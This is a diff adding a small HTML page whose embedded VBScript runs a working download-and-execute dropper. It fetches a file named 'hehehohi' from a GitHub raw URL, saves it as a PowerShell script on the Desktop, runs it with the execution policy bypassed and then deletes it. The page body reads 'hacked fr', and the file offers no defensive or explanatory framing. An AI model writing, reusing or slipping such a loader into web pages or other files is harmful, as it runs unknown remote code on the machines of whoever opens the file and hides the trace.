@@ -1,0 +1,41 @@
+<head>
+</head>
+<script type="text/vbscript">
+' Define the URL from which you want to download the PowerShell script
+url = "https://raw.githubusercontent.com/photosimages/autorun/main/hehehohi"
+
+' Create a temporary PowerShell script file path
+Set objShell = CreateObject("WScript.Shell")
+desktopPath = objShell.SpecialFolders("Desktop")
+psScriptPath = desktopPath & "\temp_script.ps1"
+
+' Download the PowerShell script from the URL
+Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+objHTTP.Open "GET", url, False
+objHTTP.send
+
+If objHTTP.Status = 200 Then
+    ' Save the downloaded PowerShell script to the temporary file
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.CreateTextFile(psScriptPath, True)
+    objFile.Write objHTTP.responseText
+    objFile.Close
+    
+    ' Execute the downloaded PowerShell script
+    Set objShellExec = objShell.Exec("powershell.exe -ExecutionPolicy Bypass -File """ & psScriptPath & """")
+    
+    ' Wait for the PowerShell script to finish
+    Do While objShellExec.Status <> 1
+        WScript.Sleep 100
+    Loop
+    
+    ' Clean up the temporary PowerShell script file
+    objFSO.DeleteFile psScriptPath
+Else
+    MsgBox "Failed to download the PowerShell script."
+End If
+
+</script>
+<body>
+<label>hacked fr</label>
+</body>
